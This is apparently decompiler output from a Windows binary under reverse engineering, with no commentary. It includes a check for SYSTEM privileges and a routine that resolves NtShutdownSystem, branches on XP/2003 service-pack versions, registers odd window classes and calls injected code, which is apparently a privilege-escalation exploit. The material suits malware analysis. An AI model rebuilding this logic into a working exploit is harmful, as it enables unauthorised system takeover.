
uint FUN_10006e05(void)

{
  BOOL BVar1;
  int iVar2;
  uint uVar3;
  undefined4 *in_FS_OFFSET;
  _SID_IDENTIFIER_AUTHORITY local_430;
  WCHAR local_428 [130];
  WCHAR local_324 [66];
  _SID_NAME_USE local_2a0;
  DWORD local_29c;
  undefined local_298 [100];
  WCHAR local_234 [258];
  DWORD local_30;
  DWORD local_2c;
  uint local_28;
  undefined *local_24;
  BOOL local_20;
  undefined *local_1c;
  undefined4 local_14;
  code *pcStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_1000e410;
  pcStack16 = FUN_1000c600;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  local_1c = &stack0xfffffbc4;
  local_28 = 0xffffffff;
  local_20 = 0;
  local_24 = (undefined *)0x0;
  local_8 = 1;
  local_30 = 0x100;
                    /* LPDWORD pcbBuffer for GetUserNameW */
                    /* LPWSTR lpBuffer for GetUserNameW */
  BVar1 = GetUserNameW(local_234,&local_30);
  if (BVar1 != 0) {
    local_430.Value[0] = '\0';
    local_430.Value[1] = '\0';
    local_430.Value[2] = '\0';
    local_430.Value[3] = '\0';
    local_430.Value[4] = '\0';
    local_430.Value[5] = '\x05';
    local_24 = local_298;
                    /* PSID * pSid for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority7 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority6 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority5 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority4 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority3 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority2 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority1 for AllocateAndInitializeSid */
                    /* DWORD nSubAuthority0 for AllocateAndInitializeSid */
                    /* BYTE nSubAuthorityCount for AllocateAndInitializeSid */
                    /* PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority for AllocateAndInitializeSid
                        */
    local_20 = AllocateAndInitializeSid
                         ((PSID_IDENTIFIER_AUTHORITY)&local_430,'\x01',0x12,0,0,0,0,0,0,0,&local_24)
    ;
    if (local_20 != 0) {
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
      memset(local_324,0,0x82);
      local_2c = 0x40;
      local_29c = 0x80;
                    /* PSID_NAME_USE peUse for LookupAccountSidW */
                    /* LPDWORD cchReferencedDomainName for LookupAccountSidW */
                    /* LPWSTR ReferencedDomainName for LookupAccountSidW */
                    /* LPDWORD cchName for LookupAccountSidW */
                    /* LPWSTR Name for LookupAccountSidW */
                    /* PSID Sid for LookupAccountSidW */
                    /* LPCWSTR lpSystemName for LookupAccountSidW */
      BVar1 = LookupAccountSidW((LPCWSTR)0x0,local_24,local_324,&local_2c,local_428,&local_29c,
                                &local_2a0);
      if (BVar1 != 0) {
                    /* wchar_t * _Str2 for wcscmp */
                    /* wchar_t * _Str1 for wcscmp */
        iVar2 = wcscmp(local_324,local_234);
        uVar3 = (uint)(iVar2 == 0);
        goto LAB_10006f2a;
      }
    }
  }
  uVar3 = 0xffffffff;
LAB_10006f2a:
  local_8 = 0;
  local_28 = uVar3;
  FUN_10006f40();
  *in_FS_OFFSET = local_14;
  return uVar3;
}




#Handle#

void FUN_10006c50(void)

{
  int unaff_EBX;
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x20) != unaff_EBX) {
                    /* HANDLE hObject for CloseHandle */
    CloseHandle(*(HANDLE *)(unaff_EBP + -0x20));
    *(int *)(unaff_EBP + -0x20) = unaff_EBX;
  }
  return;
}



Return values



undefined * __cdecl FUN_10006c81(undefined4 param_1)

{
  switch(param_1) {
  case 0:
    return &DAT_1001016c;
  case 1:
    return &DAT_10010168;
  case 2:
    return &DAT_10010164;
  case 3:
    return &DAT_10010160;
  case 4:
    return &DAT_1001015c;
  case 5:
    return &DAT_10010158;
  case 6:
    return &DAT_10010154;
  case 7:
    return &DAT_10010150;
  case 8:
    return &DAT_1001014c;
  case 9:
    return &DAT_10010148;
  default:
    return &DAT_10010144;
  }
}





int __cdecl
FUN_1000ab6f(undefined *param_1,int param_2,int param_3,undefined4 param_4,undefined4 param_5)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  char *pcVar4;
  size_t sVar5;
  HLOCAL _Dst;
  HLOCAL _Dst_00;
  HLOCAL _Dst_01;
  HLOCAL _Dst_02;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 *in_FS_OFFSET;
  undefined8 uVar6;
  undefined4 uVar7;
  undefined *local_398;
  undefined local_390 [8];
  uint local_388;
  wchar_t local_384 [256];
  undefined2 local_184;
  undefined2 local_182;
  wchar_t *local_180;
  undefined *local_17c;
  undefined2 *local_178;
  code *local_174;
  undefined4 local_170;
  undefined4 local_16c;
  undefined4 local_168;
  undefined4 local_164;
  uint local_160;
  undefined4 local_15c;
  undefined4 local_158;
  undefined4 local_154;
  undefined4 local_150;
  undefined4 local_14c;
  undefined4 local_148;
  undefined4 local_144;
  FARPROC local_140;
  HLOCAL *local_13c;
  _OSVERSIONINFOA local_138;
  short local_a4;
  undefined4 local_9c;
  undefined4 *local_98;
  HLOCAL local_94;
  int local_90;
  HLOCAL local_8c;
  HLOCAL local_88;
  undefined *local_84;
  int local_80;
  int local_7c;
  int local_78 [2];
  int local_70 [7];
  HMODULE local_54 [9];
  undefined *local_30;
  undefined4 local_2c;
  undefined4 local_28;
  char local_24;
  char local_23;
  int local_20;
  undefined4 local_14;
  code *pcStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack12 = &DAT_1000e620;
  pcStack16 = FUN_1000c600;
  local_14 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_14;
  if (((param_1 == (undefined *)0x0) || (param_2 == 0)) || (param_3 == 0)) {
    local_80 = 0x57;
    goto LAB_1000b0cf;
  }
  local_70[0] = param_3;
  local_2c = param_4;
  local_28 = param_5;
  local_24 = '\0';
  local_23 = '\0';
  local_30 = param_1 + 0x200;
  local_20 = FUN_1000c755(s_NtShutdownSystem_10010514);
  if (local_20 == 0) {
    local_80 = -0x46;
    goto LAB_1000b0cf;
  }
  iVar1 = FUN_1000beb7(&local_7c,local_78);
  if (iVar1 != 0) {
    local_80 = -0x2c;
    goto LAB_1000b0cf;
  }
  uVar2 = FUN_10009bd3(local_54);
  if ((char)uVar2 == '\0') {
    local_80 = -0x3d;
    goto LAB_1000b0cf;
  }
  local_80 = 0xffffffff;
  local_8 = 0;
  local_140 = (FARPROC)0x0;
  uVar3 = FUN_1000b369((int)local_70,&local_140);
  if ((char)uVar3 == '\0') {
    local_80 = -0x3f;
  }
  else {
    FUN_10009835((int)&DAT_10010570,0x17,param_1,FUN_1000b0de,7,local_70,0xd);
    local_17c = param_1;
    local_388 = (uint)param_1 >> 0x10;
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(&local_138,0,0x9c);
    local_138.dwOSVersionInfoSize = 0x9c;
                    /* LPOSVERSIONINFOA lpVersionInformation for GetVersionExA */
    GetVersionExA((LPOSVERSIONINFOA)&local_138);
    local_398 = &DAT_1001059c;
    local_9c = 10;
    if (((local_138.dwMajorVersion == 5) && (local_138.dwMinorVersion == 1)) && (local_a4 == 0)) {
      local_90 = 0xa4;
    }
    else {
      if (local_a4 == 1) {
        local_90 = 0xa0;
      }
      else {
        if (local_a4 == 2) {
                    /* char * _SubStr for strstr */
                    /* char * _Str for strstr */
          pcVar4 = strstr(local_138.szCSDVersion,s_v.2055_100105b4);
          local_90 = 0xa0;
          if (pcVar4 == (char *)0x0) goto LAB_1000ad21;
        }
        else {
LAB_1000ad21:
          local_90 = 0xa4;
        }
        local_398 = &DAT_100105a8;
      }
    }
    iVar1 = local_90;
    local_9c = 10;
    local_170 = 0x30;
    local_16c = 0;
    local_168 = 0;
    local_164 = 0;
    local_15c = 0;
    local_158 = 0;
    local_154 = 0;
    local_150 = 0;
    local_14c = 0;
    local_148 = 0;
    local_144 = 0;
    local_98 = &local_170;
    local_160 = (uint)(param_1 + -local_90) & 0xffff;
                    /* wchar_t * _Source for wcscpy */
                    /* wchar_t * _Dest for wcscpy */
    wcscpy(local_384,u_cnFormSyncExFBC_100104f4);
                    /* wchar_t * _Str for wcslen */
    sVar5 = wcslen(local_384);
    local_184 = (undefined2)(sVar5 << 1);
    local_182 = 0x200;
    local_180 = local_384;
    local_178 = &local_184;
    local_94 = (HLOCAL)0x0;
                    /* SIZE_T uBytes for LocalAlloc */
                    /* UINT uFlags for LocalAlloc */
    _Dst = LocalAlloc(0,8);
    local_94 = _Dst;
                    /* SIZE_T uBytes for LocalAlloc */
                    /* UINT uFlags for LocalAlloc */
    _Dst_00 = LocalAlloc(0,0x10);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(_Dst,0,8);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(_Dst_00,0,0x10);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(local_390,0,8);
    local_84 = local_390;
    local_13c = &local_8c;
    local_174 = (code *)(param_1 + 0x500);
    local_8c = _Dst;
    local_88 = _Dst_00;
    uVar6 = FUN_10009898((int)local_398,10,local_174,0x1c,8);
    uVar7 = 0;
    (*local_174)(local_98,local_178,local_178,local_13c,0x256,0x80,0,_Dst,_Dst_00,
                 (int)((ulonglong)uVar6 >> 0x20),extraout_ECX,0,(int)uVar6);
                    /* HINSTANCE hInstance for UnregisterClassA */
                    /* LPCSTR lpClassName for UnregisterClassA */
    UnregisterClassA(s_cnFormSyncExFBC_100104e4,(HINSTANCE)0x0);
    local_160 = local_388 - iVar1 & 0xffff;
                    /* SIZE_T uBytes for LocalAlloc */
                    /* UINT uFlags for LocalAlloc */
    _Dst_01 = LocalAlloc(0,8);
    local_94 = _Dst_01;
                    /* SIZE_T uBytes for LocalAlloc */
                    /* UINT uFlags for LocalAlloc */
    _Dst_02 = LocalAlloc(0,0x10);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(_Dst_01,0,8);
                    /* size_t _Size for memset */
                    /* int _Val for memset */
                    /* void * _Dst for memset */
    memset(_Dst_02,0,0x10);
                    /* wchar_t * _Source for wcscpy */
    local_8c = _Dst_01;
    local_88 = _Dst_02;
                    /* wchar_t * _Dest for wcscpy */
    wcscpy(local_384,u_cnFormVoidFBC_100104c8);
                    /* wchar_t * _Str for wcslen */
    sVar5 = wcslen(local_384);
    local_184 = (undefined2)(sVar5 << 1);
    local_182 = 0x200;
    uVar6 = FUN_10009898((int)local_398,10,local_174,0x1c,8);
    (*local_174)(local_98,local_178,local_178,local_13c,599,0x80,0,_Dst_01,_Dst_02,
                 (int)((ulonglong)uVar6 >> 0x20),extraout_ECX_00,0,(int)uVar6);
                    /* HINSTANCE hInstance for UnregisterClassA */
                    /* LPCSTR lpClassName for UnregisterClassA */
    UnregisterClassA(s_cnFormVoidFBC_100104b8,(HINSTANCE)0x0);
    FUN_10009898((int)local_398,10,local_174,0x1c,8);
    uVar2 = FUN_1000c640(local_140);
    if ((char)uVar2 == '\0') {
LAB_1000afdb:
      local_80 = -0x3d;
    }
    else {
      local_80 = (*local_174)(param_2,0x600,0,0,0,0x1f,0,_Dst,_Dst_00,extraout_EDX,extraout_ECX_01,
                              uVar7,uVar2);
      FUN_1000c640((FARPROC)0x0);
      if (local_80 == 0) {
        if (local_24 != '\0') {
          FUN_10009835((int)&DAT_10010588,0x11,param_1 + 0x200,FUN_1000b1d2,1,local_70,7);
          FUN_10009898((int)local_398,10,local_174,4,8);
          uVar2 = FUN_1000c640(local_140);
          if ((char)uVar2 == '\0') goto LAB_1000afdb;
          local_80 = 0xffffffff;
          local_80 = (*local_174)(100,_Dst,_Dst_00,extraout_EDX_00,extraout_ECX_02,uVar7,uVar2);
          FUN_1000c640((FARPROC)0x0);
          if (local_23 != '\0') goto LAB_1000b0aa;
        }
        local_80 = -0x40;
      }
    }
  }
LAB_1000b0aa:
  local_8 = 0xffffffff;
  FUN_1000b0ba();
LAB_1000b0cf:
  *in_FS_OFFSET = local_14;
  return local_80;
}


